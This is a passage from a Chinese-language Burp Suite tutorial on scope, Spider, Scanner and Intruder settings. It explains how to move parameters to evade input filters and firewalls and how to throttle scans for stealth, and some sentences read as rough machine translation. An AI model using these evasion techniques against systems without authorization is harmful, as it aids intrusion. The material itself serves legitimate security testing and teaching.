history上设置只显示在范围内的项目。并且可以设置代理拦截只有在范围内的请求和响应。Spider会扫描在范围内的地址。专业版还可以设置自动启动在范围内项目的漏洞扫描。您可以配置Intruder和Repeater跟随重定向到任何在范围内的网址。发送Burp目标以适当的方式执行行动，只针对你感兴趣并愿意攻击项目。\n\n![Image037](https://wooyun.js.org/images_result/images/2014101711120869997.png \"image037.png\")\n\n范围定义使用的URL匹配规则两个表 - 一个“包括(include)”列表和“exclude(排除)”列表中。Burp根据一个URL地址来决定，如果它是目标范围之内，这将被视为是在范围上如果URL匹配至少一个“include”在内的规则，不符合“exclude”规则。这样能够定义特定的主机和目录为大致范围内，且距离该范围特定的子目录或文件（如注销或行政职能）排除。\n\n## Spider功能\n\nBurp Spider 是一个映射 web 应用程序的工具。它使用多种智能技术对一个应用程序的内容和功能进行全面的清查。 通过跟踪 HTML 和 JavaScript 以及提交的表单中的超链接来映射目标应用程序，它还使用了一些其他的线索，如目录列表，资源类型的注释，以及 robots.txt 文件。 结果会在站点地图中以树和表的形式显示出来，提供了一个清楚并非常详细的目标应用程序 视图。能使你清楚地了解到一个 web 应用程序是怎样工作的，让你避免进行大量 的手动任务而浪费时间，在跟踪链接，提交表单，精简 HTNL 源代码。可以快速地确人应 用程序的潜在的脆弱功能，还允许你指定特定的漏洞，如 SQL 注入，路径遍历。\n\n### Using Burp Spider\n\n要对应用程序使用 Burp Spider 需要两个简单的步骤：\n\n```\n1 使用 Burp Proxy 配置为你浏览器的代理服务器，浏览目标应用程序(为了节省时间，你可 以关闭代理拦截)。 \n2 到站点地图的”target”选项上，选中目标应用程序驻留的主机和目录。选择上下文菜单的” spider this host/branch”选项。\n```\n\n![Image039](https://wooyun.js.org/images_result/images/2014101711120832553.png \"image039.png\")\n\n你也可以在任何 Burp 工具的任意请求或响应上使用上下文菜单上选择” spider this item”。当你发送一个站点地图的分支来 spidering，Spider 会首先检查这个分支是否在定义好的spidering 的范围内。如果不是，Burp 会提示你是否把相关的 URL 添加到范围里。然后，Burp 开始 spidering，并执行下面的操作：\n\n在分支上，请求那些已被发现的还没被请求过的 URL。 在分支上，提交那些已被发现但提交 URL 错误的表单。 重复请求分支上的先前收到的状态码为 304 的项，为检索到一个应用程序的新(未进入缓存)副本。 对所有的检索到内容进行解析以确认新的 URL 和表单。 只有发现新内容就递归地重复这些步骤。 继续在所有的范围区域内 spidering，直到没有新内容为止。\n\n注意 Spider 会跟踪任何在当前定义的 spidering 范围内的 URL 链接。如果你定义了一个 范围比较大的目标，并且你只选择了其中的一个分支来 spidering，这时 Spider 会跟踪所有进入到这个比较大的范围内的链接，于是也就不在原来的分支上 spider。为了确保 Spider 只在指定分支内的请求上，你应该在开始时，就把 spidering 范围配置为只在这个分支上。\n\n你应该小心地使用 Burp Spider。在它的默认设置上，Spider 会在 spidering 范围内使用 默认输入值，自动地提交任意表格，并且会请求许多平常用户在只使用一个浏览器不会发出 的请求。如果在你定义范围的 URL 是用来执行敏感操作的，这些操作都会被带到应用程序 上。在你完全地开始自动探索内容之前，使用浏览器对应用程序进行一些手动的映射，是非常可取的。\n\n### Control tab\n\n这个选项是用来开始和停止 Burp Spider，监视它的进度，以及定义 spidering 的范围。\n\n#### Spider Status\n\n![Image041](https://wooyun.js.org/images_result/images/2014101711120887420.png \"image041.png\")\n\n#### 1)Spider running\n\n这个是用来开始和停止 Spider。Spider 停止后，它自己不会产生请求，但它会 继续处理通过 Burp Proxy 的响应，并且在 spidering 范围内的新发现的项都会送入请求队列 里，当 Spider 重新启动时，再来请求。这里显示的一些 Spider 进度的指标，让你能看到剩余的内容和工作量的大小。\n\n#### 2)Clear queues\n\n如果你想改变你工作的优先权，你可以完全地清除当前队列的项目，来让其他 的项目加入队列。注意如果被清除的项目如果还在范围内并且 Spider 的分析器发现有新的 链接到这个项目，那么它们还会加入队列。\n\n#### Spider Scope\n\n在这个面板里，你能精确地定义 Spider 的请求范围。最好的方法通常是使用一套广泛的目标范围，默认情况下，蜘蛛会使用该范围。如果您需要定义不同范围的蜘蛛使用，然后选择“Use custom scope(使用自定义范围)”。进一步的配置面板会出现在相同的方式套件范围的目标范围内面板的功能。如果你使用自定义范围并向 Spider 发送不在范围内 的项，则 Burp 会自动更新这个自定义的范围而不是 Suite 范围。\n\n#### Options tab\n\n这个选项里包含了许多控制 Burp Spider 动作的选项，如下描述。这些设置在 spider 启 动后还可以修改的，并且这修改对先前的结果也是有效的。例如，如果增加了最大链接深度， 在以前的最大链接深度外的链接如果满足现在的条件，也会加入到请求队列里。\n\n#### Crawler Settings\n\n![Image043](https://wooyun.js.org/images_result/images/2014101711120858563.png \"image043.png\")\n\n#### 1)check robots.txt\n\n如果这个选项被选中，Burp Spider会要求和处理robots.txt文件，提取内容链接。这个文件是由机器人排除协议控制的蜘蛛状制剂在互联网上的行为。请注意，注意 Burp Spider不会确认 robots 排除协议。Burp Spider 会列举出目标应用程序的所有内容，请求所有在范围 内的 robots.txt 条目。\n\n#### 2)detect custom \"not found\" responses\n\nHTTP协议需要向Web服务器返回404状态码，如果一个请求的资源不存在。然而，许多Web应用程序返回使用不同的状态代码定制为“not found”的网页。如果是这种情况，则使用该选项可以防止误报的网站内容的映射。Burp Spider从每个域请求不存在的资源，编制指纹与诊断“not found”响应其它请求检测定制“not found”的回应。\n\n#### 3)ignore links to non-text content\n\n常常需要推断出在 HTML 上下文里链接到特殊资源的 MIME 类型。例如，带有 IMG 标记的 URL 会返回图像；那些带有 SCRIPT 标记的会返回 JavaScript。 如果这个选项被选中，Spider 不会请求在这个上下文出现的出现的非文本资源。使用这个选 项，会减少 spidering 时间，降低忽略掉感兴趣内容的风险。\n\n#### 4)request the root of all directories 如果这个选项被选中，Burp Spider 会请求所有已确认的目标 范围内的 web 目录，除了那些目录里的文件。如果在这个目标站点上目录索引是可用的， 这选项将是非常的有用。\n\n#### 5)make a non-parameterised request to each dynamic page\n\n如果这个选项被选中，Burp Spider 会对在范围内的所有执行动作的 URL 进行无参数的 GET 请求。如果期待的参数没有被接收， 动态页面会有不同的响应，这个选项就能成功地探测出添加的站点内容和功能。\n\n#### 6)maximum link depth\n\n这是Burp Suite在种子 URL 里的浏览”hops”的最大数。0表示让Burp Suite只请求种子 URL。如果指定的数值非常大，将会对范围内的链接进行无限期的有效跟踪。将此选项设置为一个合理的数字可以帮助防止循环Spider在某些种类的动态生成的内容。\n\n#### 7)Maximum parameterized requests per URL\n\n请求该蜘蛛用不同的参数相同的基本URL的最大数目。将此选项设置为一个合理的数字可以帮助避免爬行“无限”的内容，如在URL中的日期参数的日历应用程序。\n\n## Passive Spidering(被动扫描)\n\n![Image045](https://wooyun.js.org/images_result/images/2014101711120825072.png \"image045.png\")\n\n#### 1)passively spider as you browse\n\n如果这个选项被选中，Burp Suite 会被动地处理所有通过 Burp Proxy 的 HTTP 请求，来确认访问页面上的链接和表格。使用这个选项能让 Burp Spider 建立一个包含应用程序内容的详细画面，甚至此时你仅仅使用浏览器浏览了内容的一个子集，因为所有被访问内容链接到内容都会自动地添加到 Suite 的站点地图上。\n\n#### 2)link depth to associate with proxy requests\n\n这个选项控制着与通过 Burp Proxy 访问的 web 页面 有关的” link depth”。为了防止 Burp Spider 跟踪这个页面里的所有链接，要设置一个比上面 选项卡里的” maximum link depth”值还高的一个值。\n\n### Form Submission\n\n![Image047](https://wooyun.js.org/images_result/images/2014101711120952125.png \"image047.png\")\n\n#### 1)individuate forms\n\n这个选项是配置个性化的标准(执行 URL，方法，区域，值)。当 Burp Spider 处理这些表格时，它会检查这些标准以确认表格是否是新的。旧的表格不会加入到提交序列。\n\n#### 2)Don’t submit\n\n如果选中这个，Burp Spider 不会提交任何表单。\n\n#### 3)prompt for guidance\n\n如果选中这个，在你提交每一个确认的表单前，Burp Suite 都会为你指示引导。这允许你根据需要在输入域中填写自定义的数据，以及选项提交到服务器的哪一个 区域，以及是否遍历整个区域。\n\n#### 4)automatically submit\n\n如果选中，Burp Spider 通过使用定义的规则来填写输入域的文本值来自动地提交范围内的表单。每一条规则让你指定一个简单的文本或者正则表达式来匹配表单字段名，并提交那些表单名匹配的字段值。可以为任意不匹配的字段指定默认值。\n\n在应用程序通常需要对所有输入域都是有效格式的数据的地方，如果你想通过登记表单 和相似功能自动地 spider，则这个选项会非常有用。在自动地把表单数据提交到广阔范围内 的应用程序时，Burp 使用一组非常成功的规则。当然，如果你遇到有自己需要提交的特定 值的表单字段名时，你可以修改这些或者添加自己的规则。你要小心地使用这个选项，因为 提交了表单里的虚假值有时会导致一些不希望看到操作。\n\n许多表单包含了多个提交元素，这些会对应用程序进行不同的操作，和发现不同的内容。 你可以配置 Spider 重复通过表单里提交元素的值，向每个表单提交多次，次数低于配置的 最大值。\n\n### Application Login\n\n![Image049](https://wooyun.js.org/images_result/images/2014101711120998771.png \"image049.png\")\n\n登陆表单在应用程序中扮演一个特殊角色，并且你常常会让 Burp 用和处理平常表单不 一样的方式来处理这个表单。使用这个配置，你可以告诉 Spider 在遇到一个表单执行下面 4 种不同操作的一种：\n\n```\n1.如果你没有证书，或者关注 Spidering 的敏感保护功能，Burp 可以忽略登陆表单。\n2.Burp 能交互地为你提示引导，使你能够指定证书。这时默认设置项。\n3.Burp 通过你配置的信息和自动填充规则，用处理其他表单的方式来处理登陆表单。\n4.在遇到的每个登陆表单时，Burp 能自动地提交特定的证书。 \n```\n\n在最后一种情况下，任何时间 Burp 遇到一个包含密码域的表单，会提交你配置的密码到密码域，提交你配置用户名到最像用户名的字段域。如果你有应用程序的证书，想让 Spider为你处理登陆，通常情况下这是最好的选项\n\n### Spider Engine\n\n![Image051](https://wooyun.js.org/images_result/images/2014101711121055065.png \"image051.png\")\n\n这些设置控制用于Spidering时发出HTTP请求的引擎。下列选项可用：\n\n```\n1)Number of threads----此选项控制并发请求进程数。\n2)Number of retries on network failure----如果出现连接错误或其他网络问题，BurpSuite会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。\n3)Pause before retry----当重试失败的请求，BurpSuite会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器被宕掉、繁忙或间歇性的问题发生，最好是等待很短的时间，然后重试。\n4)Throttle between requests----BurpSuite可以在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。\n5)Add random variations to throttle----此选项可以通过降低您的要求的时序模式进一步增加隐身。\n```\n\n### Request Headers\n\n这些设置控制由蜘蛛发出的HTTP请求中使用的请求头。您可以配置头蜘蛛在请求中使用的自定义列表。这可能是有用的，以满足各个应用程序的特定要求 - 例如，测试设计用于移动设备的应用程序时，以模拟预期的用户代理。\n\n以下选项也可用：\n\n![Image053](https://wooyun.js.org/images_result/images/2014101711121061095.png \"image053.png\")\n\n```\n1)Use HTTP version 1.1----如果选中，Spider会使用HTTP1.1版在其请求;否则，它会使用1.0版。\n\n2)Use Referer header----如果选中，Spider会要求从另一个页面链接到任何项目时提交相关Referer头。此选项很有用更加紧密地模拟将通过您的浏览器发出的请求，并且还可能需要浏览一些应用程序验证Referer头。\n```\n\n## Scanner功能\n\n### Using Burp Scanner\n\n分以下几个步骤来简单使用Scanner 1.设置好代理之后在地址栏输入你要抓取的地址，并且要在Proxy里把拦截关了，随后切换到Scanner的Results就可以看到地址已经在开始扫描咯\n\n![Image055](https://wooyun.js.org/images_result/images/2014101711121128756.png \"image055.png\")\n\n2.对地址右击还可以导出报告，\n\n![Image057](https://wooyun.js.org/images_result/images/2014101711121157380.png \"image057.png\")\n\n![Image059](https://wooyun.js.org/images_result/images/2014101711121141522.png \"image059.png\")\n\nHtml或者xml随便你以什么格式的，然后一直下一步下一步到如下图选择保存文件到哪\n\n![Image061](https://wooyun.js.org/images_result/images/2014101711121154576.png \"image061.png\")\n\n我们打开看看，是不是很漂亮呢\n\n![Image063](https://wooyun.js.org/images_result/images/2014101711121194134.png \"image063.png\")\n\n3.如果扫描出漏洞了我们还可以直接在这针对某个漏洞进行查看，如果想测试的话可以发送到Repeater进行测试哦\n\n![Image065](https://wooyun.js.org/images_result/images/2014101711121260493.png \"image065.png\")\n\n### Results\n\n结果选项卡包含所有的扫描仪已确定，从主动和被动扫描的问题。以一种树型图显示应用程序的内容，其中的问题已经被发现，使用URL分解成域，目录和文件的层次表示。如果您选择一个或多个部分的分支，所有选定的项目将扫描的问题都列出来，用组合在一起的相同类型的问题。您还可以扩大这些问题汇总查看所有的每种类型的个别问题。 如果您选择的问题那么将显示相应的详情，包括：\n\n```\n1)自定义的漏洞，咨询内容包括：\n问题类型及其整治的标准描述。\n中适用于该问题，并影响其修复任何特定的功能的描述。\n2)完整的请求和响应都是依据报告了该问题。在适用的情况，是相关的识别和再现问题的请求和响应的部分在请求和响应消息的编辑器中突出显示。\n```\n\n通常情况下，测试并验证一个问题最快的方法是使用发送到Repeater。另外，对于GET请求，您可以复制此URL，并将其粘贴到浏览器中。然后，您可以重新发出请求。 Burp扫描报告描述，每一个问题都会给出严重程度（高，中，低，资讯）和置信度（肯定的，坚定的，暂定）的评级。当一个问题一直使用一种技术，本质上是不太可靠（如SQL盲注）确定，Burp会让你意识到这一点，通过丢弃的置信水平存在一定不足。这些额定值应始终被解释为指示性的，你应该根据你的应用程序的功能和业务方面的知识进行审查。\n\n这个问题已经上市，你可以用它来执行以下操作的上下文菜单：如图所示\n\n![Image067](https://wooyun.js.org/images_result/images/2014101711121228957.png \"image067.png\")\n\n### Report selected issues\n\n启动BurpSuite Scanner的报告向导，生成的选定问题的正式报告。 Set severity - 这让你重新分配问题的严重程度。您可以设置严重程度高，中，低，或信息。您还可以标记问题作为假阳性。\n\n### Delect selected issues\n\n删除选定问题。请注意，如果你删除了一个问题，Burp重新发现了同样的问题（例如，如果你重新扫描了同样的要求），那么问题将再次报告。相反，如果你是一个假阳性标记的问题，那么这将不会发生。因此，最适合用于清理扫描结果移除你不感兴趣。对于内部的功能不需要您的问题仍然工作在主机或路径删除的问题，您应该使用假阳性的选项。\n\n### Scan Queue\n\nActive Scanning(主动扫描)过程通常包括发送大量请求到服务器为所扫描的每个基本的请求，这可能是一个耗时的过程。当您发送的主动扫描请求，这些被添加到活动扫描队列，它们被依次处理。如图\n\n![Image069](https://wooyun.js.org/images_result/images/2014101711121261155.png \"image069.png\")\n\n扫描队列中显示每个项目的详细信息如下：\n\n```\n1)索引号的项目，反映该项目的添加顺序。\n2)目的地协议，主机和URL 。\n3)该项目的当前状态，包括完成百分比。\n4)项目扫描问题的数量（这是根据所附的最严重问题的重要性和彩色化） 。\n5)在扫描项目的请求数量进行。\n注意 这不是插入点的数量的线性函数 - 观察应用程序行为的反馈到后续攻击的请求，仅仅因为它会为一个测试仪。\n6)网络错误的数目遇到的问题。\n7)为项目创建的插入点的数量。\n```\n\n这些信息可以让您轻松地监控个别扫描项目的进度。如果您发现某些扫描进度过于缓慢，可以理解的原因，如大量的插入点，缓慢的应用响应，网络错误等给定这些信息，你就可以采取行动来优化你的扫描，通过改变配置为插入点时，扫描引擎，或正在测试的主动扫描区域。\n\n你可以双击任何项目在扫描队列显示，到目前为止发现的问题，并查看了基本请求和响应的项目。您可以使用扫描队列的上下文菜单来执行各种操作来控制扫描过程。确切的可用选项取决于所选的项目（S ）的状态，并包括：如下图所示\n\n![Image071](https://wooyun.js.org/images_result/images/2014101711121223207.png \"image071.png\")\n\n### Show details\n\n这将打开显示到目前为止发现的问题的一个窗口，与底座请求和响应的项目。\n\n### Scan again\n\n此复制所选择的项目（S ） ，并将这些队列的末尾。\n\n### Delete item(S)\n\n这将永久地从队列中删除选定的项目（S ） 。\n\n### Delect finished items\n\n这永久删除那些已经完成了队列中的任何项目。\n\n### Automatically delete finished items\n\n这是否切换扫描器会自动从队列为他们完成删除项目。\n\n### Pause/resume scanner\n\n这可以暂停和恢复激活扫描仪。如果任何扫描正在进行时，扫描会暂停，而挂起的扫描请求完成后，通常会有一个短暂的延迟。\n\n### Send to\n\n这些选项用于所选项目的基本请求发送到其它Burp(Repeater、Intruder)工具。\n\n### Live Scanning\n\n实时扫描可让您决定哪些内容通过使用浏览器的目标应用，通过BurpProxy服务器进行扫描。您可以实时主动扫描设定live active scanning和live passive两种扫描模式。如图\n\n![Image073](https://wooyun.js.org/images_result/images/2014101711121272043.png \"image073.png\")\n\n### Live active scanning\n\n执行现场主动扫描，请执行以下步骤：\n\n```\n1)配置与目标的细节，你要主动扫描现场主动扫描设置。如果你已经配置了一套全范围的目标为你目前的工作，那么你可以简单地通知Burp主动扫描落在该范围内的每个请求。或者，您可以使用URL匹配规则定义自定义范围。 \n2)各地通过BurpProxy通常的方式应用浏览。这将有效地展示Burp要扫描的应用功能。对于每一个独特的所在范围的要求，你通过你的浏览器，Burp会排队主动扫描请求，并将努力走在后台找到漏洞为您服务。\n```\n\n### Live Passive Scanning\n\n现场演示被动扫描，请执行以下步骤：\n\n```\n1)配置具有您要被动地扫描目标的细节live passive scanning。默认情况下，Burp执行所有请求的被动扫描，但你可以限制扫描目标范围，或者使用URL匹配规则的自定义范围。 \n2)通过BurpProxy通常的方式应用浏览。这将有效地展示Burp你要扫描的应用功能。\n```\n\n### Options\n\n此选项卡包含Burp扫描选项进行攻击的插入点，主动扫描引擎，主动扫描优化，主动扫描区和被动扫描区域。\n\n### Attack Insertion Points\n\n这些设置控制扫描仪的地方“插入点(insertion points)”到被发送的主动扫描每个基本要求。插入点攻击将被放置，探测漏洞请求中的位置。每个定义的插入点单独扫描。 BurpSuite为您提供细粒度地控制放置插入点，以及这些选项仔细配置会让您量身定制您的扫描到您的目标应用程序的性质。插入点的配置也代表你的扫描速度和全面性之间进行权衡。\n\n注：除了让Burp自动指定插入点，就可以完全自定义这些，这样你就可以在你想要攻击的地方放在任意一个位置。要使用此功能，将请求发送给Intruder，用payload positions标签来定义通常的方式各插入点的开始和结束，并选择入侵者菜单选项“积极定义扫描插入点” 。您也可以指定以编程方式使用Burp扩展的自定义插入点位置。\n\n![Image075](https://wooyun.js.org/images_result/images/2014101711121335428.png \"image075.png\")\n\n#### 1)Insertion Point Locations\n\n这些设定可让您选择，其中插入点应放在请求中的位置的类型：\n\n```\nURLparameter values - URL查询字符串中标准的参数值。\nBody parameter values - 在邮件正文中，包括标准形式生成的参数参数值，属性的多重编码的参数，如上传的文件名， XML参数值和属性，和JSON值。\nCookieparameter values - 的HTTP Cookie的值。\nParameter name - 任意添加的参数的名称。 URL参数总是被添加，并且机身参数也加入到POST请求。测试一个附加的参数名称通常可以检测到被错过，如果只是参数值进行了测试异常的错误。\nHTTPheaders - 在引用页和用户代理标头的值。测试这些插入点通常可以检测如SQL注入或跨站脚本持续在日志记录功能的问题。\nAMF string parameters- 内AMF编码的邮件的任何字符串数据的值。\nREST-style URL parameters - URL的文件路径部分中的所有目录和文件名令牌的值。测试每一个插入点可以并处显著开销，如果你相信应用程序使用这些位置传送参数数据，才应使用。\n```\n\n#### 2)Change Parameter Locations\n\n允许您配置扫描仪将一些类型的插入点到其他地点的请求中，除了测试他们在原来的位置。例如，您可以将每个URL参数到邮件正文中，并重新测试它。或者你可以移动身体的每个参数到一个cookie ，然后重新测试它。\n\n用这种移动参数方式往往可以绕过防过滤器。许多应用程序和应用程序防火墙执行每个参数输入验证假设每个参数是它的预期位置的要求之内。移动参数到不同的位置可以回避这个验证。当应用程序代码后检索参数来实现其主要的逻辑，它可能会使用一个API，它是不可知的，以参数的位置。如果是这样，那么移动的参数可能可以使用输入，通常会在处理之前被过滤，以达到易受攻击的代码路径。\n\n下列选项可用于更改参数的位置：\n\n```\nURL to body\nURL to cookie\nBody to URL\nBody to cookie\nCookie to URL\nCookie to body\n```\n\n#### 3)Nested Insertion Points\n\n嵌套的插入时，会使用一个插入点的基值包含可识别的格式的数据。 例如，一个URL参数可能包含Base64编码数据，并且将解码后的值可能又包含JSON或XML数据。与使用启用嵌套插入点的选项，Burp会为输入在每个嵌套级别中的每个单独的项目适合的插入点。 Spider仅包含常规的请求参数请求时使用此选项不征收费用，但允许Burp达到更复杂的应用，数据是在不同的格式封装的攻击面。\n\n#### 4)Maximum Insertion Points Per Request\n\n无论你的设置选择，对于单个请求插入点的数目，一般视乎该请求的功能，如参数的数目。偶尔，请求可以包含的参数（几百或更多）数量。如果Burp执行的每个参数进行完全扫描，扫描会花费过多的时间量完成。 此设置允许您设置的，将每个基本要求生成插入点的数量的限制，从而防止您的扫描由偏快转为停滞，如果他们遇到含参数庞大的数字请求。在其中插入点的数量是由这个限制缩减的情况下，在有效扫描队列中的项目的条目将显示被跳过的插入点的数量，使您能够手动检查基本要求，并决定是否值得执行完全扫描其所有可能的插入点。\n\n#### 5)Skipping Parameters\n\n设定让您指定请求参数的Burp应该跳过某些测试。有跳过服务器端注入测试（如SQL注入）和跳过所有检查单独的列表。 服务器端注入测试是比较费时的，因为Burp发送多个请求探测服务器上的各种盲目的漏洞。如果您认为出现请求中的某些参数不容易（例如，内置仅由平台或Web服务器中使用的参数） ，你可以告诉Burp不能测试这些。 （用于测试客户端蝽象跨站点脚本涉及更少的开销，因为测试每个参数规定最小的开销在扫描期间，如果该参数不容易。 ） 如果一个参数是由您不希望测试一个应用程序组件来处理，或者修改一个参数是已知的导致应用程序不稳定跳过所有的测试可能是有用的。 列表中的每个项目指定参数类型，该项目要匹配（名称或值） ，匹配类型（文本字符串或正则表达式） ，表达式匹配。 你可以通过它们的位置（斜线分隔）的URL路径中标识的REST参数。要做到这一点，从参数下拉，“姓名”，从项目下拉“ REST参数” ，并指定您希望从测试中排除的URL路径中的位置的索引号（从1开始） 。您还可以通过值来指定REST参数。\n\n### Active Scanning Engine\n\n控制用来做主动扫描时发出HTTP请求的引擎。下列选项可用：\n\n![Image077](https://wooyun.js.org/images_result/images/2014101711121391377.png \"image077.png\")\n\n```\n1)Number of threads - 控制并发请求数。\n2)Number of retries on network failure - 如果出现连接错误或其他网络问题，Burp会放弃和移动之前重试的请求指定的次数。测试时间歇性网络故障是常见的，所以最好是在发生故障时重试该请求了好几次。\n3)Pause before retry - 当重试失败的请求，Burp会等待指定的时间（以毫秒为单位）以下，然后重试失败。如果服务器宕机，繁忙，或间歇性的问题发生，最好是等待很短的时间，然后重试。\n```\n\n**Throttle between requests** - 在每次请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。\n\n**Add random variations to throttle** - 通过降低您的要求的时序模式进一步增加隐身。\n\n**Follow redirections where necessary**- 有些漏洞只能通过下面的重定向进行检测（例如，在一条错误消息，跨站点脚本这是只有下列一个重定向后退还）。因为某些应用程序的问题重定向到包含您所提交的参数值的第三方网址，BurpSuite保护您免受无意中攻击的第三方应用程序，不按照刚刚收取任何重定向。如果所扫描的要求是明确的目标范围之内（即您使用的是目标范围，以控制哪些被扫描的），然后BurpSuite只会跟随重定向是指同一范围内。如果所扫描的要求不在范围内（即你已经手动发起超出范围的请求的扫描），BurpSuite只会跟随重定向其中（a）是在同一台主机/端口的请求被扫描;及（b）没有明确涵盖的范围排除规则（如“logout.aspx”）。\n\n小心使用这些选项可让您微调扫描引擎，根据不同应用对性能的影响，并在自己的处理能力和带宽。如果您发现该扫描仪运行缓慢，但应用程序表现良好和你自己的CPU利用率很低，可以增加线程数，让您的扫描进行得更快。如果您发现连接错误发生，该应用程序正在放缓，或者说自己的电脑被锁定了，你应该减少线程数，也许增加网络故障和重试之间的间隔重试的次数。如果应用程序的功能是这样的：在一个基地的要求执行的操作干扰其他请求返回的响应，你应考虑减少线程数为1，以确保只有一个单碱基请求被扫描的时间。\n\n### Active Scanning Optimization\n\n主动扫描逻辑的行为，以反映扫描的目的和目标应用程序的性质。例如，您可以选择更容易发现问题，在一个大型应用程序的快速扫描;或者您可以执行更慢全面扫描，以发现更难，而且需要更多的扫描请求，以检测问题。\n\n![Image079](https://wooyun.js.org/images_result/images/2014101711121341699.png \"image079.png\")\n\n下列选项可用：\n\n**Scan speed(扫描速度)** - 该选项决定彻底的某些扫描检查，怎么会检查是否有漏洞时。 “Fast(快速)”设置使更少的请求，并检查一些漏洞更少的推导。在“Thorough(彻底)”的设置使更多的请求，并检查更多的衍生类型的漏洞。 “Normal(正常)”设定为中途在两者之间，并且代表速度和完整性之间的适当折衷对于许多应用。\n\n**Scan accuracy(扫描精度)** - 此选项决定的证据表明，扫描仪会报告某些类型的漏洞之前，要求的金额。可以只使用“blind(盲)”的技术，其中，Burp推断可能存在基于某些观察到的行为，如时间延迟或一个差分响应的一个漏洞被检测到的一些问题。因为这些观察到的行为的发生原因，无论如何，在没有相关联的漏洞的影响，该技术本身更容易出现假阳性比其他技术，例如在观察错误消息。试图减少误报，BurpSuite重复某些测试了一些，当一个假定的问题，推断时间，尝试建立提交的输入和观察到的行为之间有可靠的相关性。的准确性选项用于控制BurpSuite会多少次重试这些测试。在“Minimize false negatives(最小化假阴性)”的设置进行重试较少，因此更可能报告假阳性的问题，但也不太可能会错过由于不一致的应用程序行为的真正问题。在“Minimize false positives(最小化误报)”设置进行更多的试，所以是不太可能报告假阳性的问题，但可能会因此错误地错过了一些真正的问题，因为有些重试请求可能只是碰巧不返回结果是测试。 “Normal(正常)”设置为中途两者之间，并代表之间的假阳性和假阴性的问题合适的权衡对于许多应用。\n\n**Use intelligent attack selection(使用智能进攻选择)** - 此选项使通过省略出现无关紧要给每个插入点参数的基值支票扫描更有效率。例如，如果一个参数值包含不正常出现在文件名中的字符，BurpSuite会跳过文件路径遍历检查此参数。使用这个选项，可以加快扫描件，具有相对低的存在缺少实际的漏洞的风险。\n\n### Active Scanning Areas\n\n定义哪些是主动扫描过程中进行检查。是检查以下类别可供选择：\n\n![Image081](https://wooyun.js.org/images_result/images/2014101711121323228.png \"image081.png\")\n\n```\nSQL injection(SQL注入) - 这有子选项，以使不同的测试技术（误差为基础，延时测试，布尔条件测试） ，并且也使检查特定于单个数据库类型（ MSSQL ，Oracle和MySQL的） 。\nOS command injection(操作系统命令注入) - 这有子选项，以使不同的测试技术.。\nReflected XSS(反映了跨站点脚本)\nStored XSS(存储的跨站点脚本)\nFile path traversal(文件路径遍历)\nHTTP header injection(HTTP头注入)\nXML/SOAP injection(XML / SOAP注射)\nLDAP injection(LDAP注入)\nOpen redirection(开放重定向)\nHeader manipulation(头操纵)\nServer-level issues服务器级的问题\n```\n\n所执行的每个检查增加的请求的数目，以及每个扫描的总时间。您可以打开或关闭个别检查根据您的应用程序的技术知识。例如，如果你知道某个应用程序不使用任何LDAP ，您可以关闭LDAP注入测试。如果你知道哪个后端数据库的应用程序使用，你可以关闭SQL注入检测特定于其他类型的数据库。您也可以选择性地启用基于你如何严格要求你的扫描是检查。例如，您可以配置BurpSuite做应用程序的快速一次过，只为XSS和SQL注入的网址和参数检查，每漏洞类型更全面的测试在每一个插入点之前。\n\n### Passive Scanning Areas\n\n自定义的请求和响应的各个方面在被动扫描检查。下列选项可用：\n\n![Image083](https://wooyun.js.org/images_result/images/2014101711121316955.png \"image083.png\")\n\n```\nHeaders--头 \nForms--表格 \nLinks--链接 \nParameters--参数 \nCookie \nMIME类型 \nCaching缓存 \nInformation disclosure--信息披露 \nFrameable responses--耐燃反应（“点击劫持”） \nASP.NET的ViewState \n需要注意的是被动扫描不会派出自己的任何要求，和每个被动强加检查您的计算机上一个微不足道的处理负荷。不过，你可以禁用检查各个领域，如果你根本就不关心他们，不希望他们出现在扫描结果。\n```\n\n## Intruder\n\nBurp intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击。它可以用来自动执行所有类型的任务您的测试过程中可能出现的。\n\n![Image085](https://wooyun.js.org/images_result/images/2014101711121336510.png \"image085.png\")\n\n![Image087](https://wooyun.js.org/images_result/images/2014101711121439648.png \"image087.png\")\n\n要开始去了解BurpSuite Intruder，执行以下步骤：\n\n```\n1)首先，确保Burp安装并运行，并且您已配置您的浏览器与Burp工作。\n2)如果你还没有这样做的话，浏览周围的一些目标应用程序，来填充的应用程序的内容和功能的详细信息Burp的SiteMap。在这样做之前，要加快速度，进入代理服务器选项卡，然后截取子标签，并关闭代理拦截（如果按钮显示为“Intercept is On”，然后点击它来截取状态切换为关闭） 。\n3)转到Proxy选项卡，并在History选项卡。发现一个有趣的前瞻性要求，您的目标应用程序，包含了一些参数。选择这个单一的请求，然后从上下文菜单中选择“Send to intruder” 。\n4)转到Intruder标签。Burp Intruder可以让你同时配置多个攻击。您Send to Intruder的每个请求在自己的攻击选项卡中打开，而这些都是顺序编号的默认。您可以双击标签头重命名选项卡，拖动标签来重新排序，并且还关闭和打开新的标签页。\n5)为您发送请求建立的Intruder选项卡，看看Target和Positions选项卡。这些已经自动填入您发送的请求的细节。\n6)Burp Intruder本质工作，采取了基本模板的要求（你送到那里的那个） ，通过一些payloads的循环，将这些payloads送入定义的Positions，基本要求范围内，并发出每个结果的要求。位置标签用于配置，其中有效载荷将被插入到基本要求的位置。你可以看到，BurpSuite一直在你想用来放置有效载荷自动进行猜测。默认情况下，有效载荷放入所有的请求参数和cookie的值。每对有效载荷标记定义了一个有效载荷的位置，并且可以从基体的要求，这将被替换的有效载荷的内容，当该payload position用于括一些文本。有关进一步详情，请参阅Payload Markers的帮助。\n7)旁边的请求编辑器中的按钮可以被用于添加和清除有效载荷的标志。试着增加payload position在新的地点请求中，并删除其他标志物，并看到效果了。当你理解了payload positions是如何工作的，请单击“Auto§ ”按钮恢复到BurpSuite为您配置的默认payload positions。如果你修改了请求本身的文本，可以重复步骤3创建与它的原始请求一个新的Intruder的攻击选项卡。\n```\n\n![Image089](https://wooyun.js.org/images_result/images/2014101711121441372.png \"image089.png\")\n\n```\n8)转到Payloads选项卡。这使您可以定义将要放入已定义的有效载荷仓的有效载荷。保持默认设置（使用有效载荷的“Simple list” ） 